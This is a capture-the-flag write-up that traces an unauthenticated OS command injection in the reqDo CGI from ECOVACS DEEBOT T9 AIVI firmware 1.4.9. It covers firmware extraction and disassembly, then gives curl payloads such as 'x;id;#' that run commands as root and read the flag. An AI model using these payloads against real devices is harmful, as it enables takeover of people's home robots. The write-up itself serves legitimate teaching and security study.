# [Clean Sweep](https://nnsc.tf/challenges?challenge=boot2root_Clean+Sweep)

**Description:**

The NNS house has never been cleaner, but our old ECOVACS DEEBOT T9 AIVI is still running firmware 1.4.9 from 2021. We extracted the web CGI from that firmware and are hosting it here for you. The floors may be spotless. The firmware is another story. Can you sweep through it and get root?

## 1. Recon the live server

A plain request to the root path returns an empty JSON body:

```bash
curl -s -i https://clean-sweep-4d745d6e7fcf.chall.nnsc.tf/
```

```
HTTP/2 200
content-type: application/json
```

Testing a path that clearly doesn't exist returns the same thing, which tells us this isn't a real file being served, it's a catch-all. So root, `robots.txt`, and `index.html` are all dead ends.

Testing `/cgi-bin/nonexistent.cgi` gives a different result:

```bash
curl -s -i https://clean-sweep-4d745d6e7fcf.chall.nnsc.tf/cgi-bin/nonexistent.cgi
```

```
HTTP/2 404
<html>
    <head><title>Document Error: Not Found</title></head>
    <body><h2>Access Error: Not Found</h2></body>
</html>
```

That error template is the default 404 page for GoAhead, not nginx's default. So the real application lives somewhere under this path space, behind nginx as a reverse proxy. This confirms the target is the actual firmware webserver, not scaffolding.

## 2. Get the real firmware

The challenge doesn't attach a firmware file, but the description gives us everything needed to fetch it ourselves: ECOVACS DEEBOT T9 AIVI, firmware 1.4.9. There's a public tool that pulls firmware directly from Ecovacs' OTA servers:

```bash
git clone https://github.com/denysvitali/ecovacs-firmware-tools.git
cd ecovacs-firmware-tools
go build -o ecovacs-firmware-tools .
```

Search for the firmware:

```bash
./ecovacs-firmware-tools download --models 659yh8 -v
```

This finds `659yh8 fw0 v1.4.9`, matching the version in the challenge description exactly. Download it:

```bash
./ecovacs-firmware-tools download --models 659yh8 --base-version 1.4.9 --modules fw0 --download -o firmware_dir -v
```

This pulls a 59,611,104 byte `.bin` file.

## 3. Decrypt and extract the filesystem

The same tool decrypts the firmware image into its component sections:

```bash
./ecovacs-firmware-tools decrypt firmware_dir/659yh8_fw0_v1.4.9_1de7de90.bin -o decrypted_dir -v
```

This produces six sections: `manifest.json`, `pre_upgrade_script.sh`, `normal_boot.bin`, `normal_fs.img`, `mcu.img`, `post_upgrade_script.sh`.

`normal_fs.img` is what we want:

```bash
file decrypted_dir/normal_fs.img
```

```
Squashfs filesystem, little endian, version 4.0, zlib compressed
```

Extract it:

```bash
cd decrypted_dir
unsquashfs normal_fs.img
```

This gives a full `squashfs-root/` filesystem tree, the actual root filesystem of the robot.

## 4. Find the webserver and the CGI binary

```bash
find squashfs-root -iname "boa*" -o -iname "goahead*" -o -iname "httpd*"
```

```
squashfs-root/etc/rc.d/goahead.sh
squashfs-root/usr/sbin/goahead
```

Confirms GoAhead, matching what we saw in the 404 page earlier. The startup script shows how it's launched:

```bash
cat squashfs-root/etc/rc.d/goahead.sh
```

```sh
goahead -v -r /etc/www/route.txt -a /etc/www/auth.txt --home "/etc/www" web 'http://*:8888' &
```

The routing config tells us how requests map to handlers:

```bash
cat squashfs-root/etc/www/route.txt
```

```
route uri=/action handler=action
route uri=/ extensions=jst,asp handler=jst
route uri=/ extension=cgi|fcgi|mycgi handler=cgi
...
```

Anything ending in `.cgi` under the webroot gets executed as a CGI program. There's a binary sitting right in that webroot:

```bash
ls -la squashfs-root/etc/www/
```

```
-rwxr-xr-x 1 121 129 27392 Jul 23  2021 reqDo
```

```bash
file squashfs-root/etc/www/reqDo
```

```
ELF 64-bit LSB executable, ARM aarch64, dynamically linked, with debug_info, not stripped
```

Unstripped, with debug info. This is our target binary.

## 5. Confirm the live endpoint

The route config only executes `.cgi` extensions, so on the live target the binary is deployed as `reqDo.cgi` at the webroot:

```bash
curl -s -i -X POST https://clean-sweep-4d745d6e7fcf.chall.nnsc.tf/reqDo.cgi \
  -H "Content-Type: application/json" \
  -d '{"td":"GetDevInfo"}'
```

```
HTTP/2 200
content-type: application/json
```

It's alive and responding. Now we need to know what commands it accepts and how it processes them.

## 6. Static analysis of reqDo

Pull readable strings first to get a map of the binary's logic:

```bash
strings squashfs-root/etc/www/reqDo | grep -iE "system|popen|exec|sprintf|getenv"
```

```
sprintf
popen
getenv
cmd_system
popen error  cmd :%s
```

And the command dispatcher:

```
GetWCInfo
SetApConfig
SetFct
GetCredential
GetDevInfo
GetNetworkLog
```

```
td="SetApConfig" SSID="%s" PASSPHRASE="%s" sc="%s" sck2="%s" lb="%s" %s
td=SetFct did=%s password=%s type=%s sc=%d lb=%s %s
```

This is a JSON-RPC style dispatcher. It reads a `td` field from the POST body's JSON and routes to one of these handlers. The last two strings are format templates that get built with `sprintf`/`snprintf` and handed off somewhere involving `popen`, which is exactly the shape of an embedded-device command injection bug: build a shell command by string-formatting request data, then execute it.

Note the difference between the two format strings: `SetApConfig` wraps its fields in double quotes, `SetFct` does not. That's the detail that matters.

Disassemble the relevant functions:

```bash
sudo apt install binutils-aarch64-linux-gnu -y
aarch64-linux-gnu-objdump -d --disassemble=SetFct reqDo
aarch64-linux-gnu-objdump -d --disassemble=cmd_system reqDo
```

Reading through `SetFct`, it pulls four JSON string fields via `CFJsonObjectGetString`: `did`, `password`, `type`, `lb`. If any of them is missing, the function bails out early. If all four are present, it builds a command line with `snprintf`:

```
td=SetFct did=%s password=%s type=%s lb=%s %s
```

None of `did`, `password`, `type`, `lb` are quoted in this format string.

Then `cmd_system` is called with that built string. Disassembling `cmd_system` shows it's a thin wrapper:

```c
FILE *fp = popen(cmd, "r");   // cmd = our fully attacker-influenced string, unsanitized
n = safe_fread(fp, outbuf, outbuflen);
pclose(fp);
```

And back in `SetFct`, after `cmd_system` returns successfully, the output buffer gets `printf`'d, which becomes the CGI's stdout, which is the HTTP response body.

So the full picture: a JSON field goes straight into a shell command string with no quoting and no filtering, that string goes straight into `popen()`, and the command's output goes straight back into the HTTP response. This is unauthenticated OS command injection with output reflection, no blind exploitation needed.

# 7. Build the injection

Because there's no quoting around `%s`, we don't need to escape out of anything, we can just place shell metacharacters directly inside one of the fields. Given the surrounding literal text, setting `did` to:

```
x;id;#
```

turns the generated shell command into:

```
td=SetFct did=x;id;# password=a type=a lb=a /etc/wifi/bumbee_hook.sh
```

which the shell parses as three separate statements: a harmless variable assignment, then `id` runs as its own command, then `#` comments out the rest of the line.

`sc` is optional, but `did`, `password`, `type`, and `lb` all have to be present with non-empty values or the function returns before ever reaching `cmd_system`.

## 8. Confirm and exploit

```bash
curl -s -X POST https://clean-sweep-4d745d6e7fcf.chall.nnsc.tf/reqDo.cgi \
  -H "Content-Type: application/json" \
  -d '{"td":"SetFct","did":"x;id;#","password":"a","type":"a","lb":"a"}'
```

```
uid=0(root) gid=0(root) groups=0(root)
```

Command execution confirmed, running as root. Read the flag the same way:

```bash
curl -s -X POST https://clean-sweep-4d745d6e7fcf.chall.nnsc.tf/reqDo.cgi \
  -H "Content-Type: application/json" \
  -d '{"td":"SetFct","did":"x;cat /root/flag.txt;#","password":"a","type":"a","lb":"a"}'
```

The response body contains the flag.
